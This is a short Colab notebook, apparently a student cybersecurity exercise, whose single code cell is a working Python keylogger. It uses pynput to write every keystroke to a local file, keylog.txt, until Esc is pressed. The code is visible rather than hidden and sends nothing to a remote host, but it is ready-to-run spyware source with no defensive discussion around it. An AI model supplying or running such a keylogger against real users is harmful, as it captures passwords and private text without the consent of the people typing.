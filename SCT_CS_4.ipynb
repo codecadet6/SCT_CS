{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOYH5iK3Ye/zklxz14uGbKg",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/codecadet6/SCT_CS/blob/main/SCT_CS_4.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "Amv-CZc5PhlE"
      },
      "outputs": [],
      "source": [
        "from pynput.keyboard import Key, Listener\n",
        "\n",
        "log_file = \"keylog.txt\"\n",
        "\n",
        "def on_press(key):\n",
        "    with open(log_file, \"a\") as f:\n",
        "        try:\n",
        "            f.write(str(key.char))\n",
        "        except AttributeError:\n",
        "            if key == Key.space:\n",
        "                f.write(\" \")\n",
        "            elif key == Key.enter:\n",
        "                f.write(\"\\\\n\")\n",
        "            else:\n",
        "                f.write(f\"[{str(key).replace('Key.', '')}]\")\n",
        "\n",
        "def on_release(key):\n",
        "    if key == Key.esc:\n",
        "        return False\n",
        "\n",
        "print(f\"Keylogger started. Press 'Esc' to stop. Logging to {log_file}\")\n",
        "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
        "    listener.join()\n",
        "\n",
        "print(\"Keylogger stopped.\")"
      ]
    }
  ]
}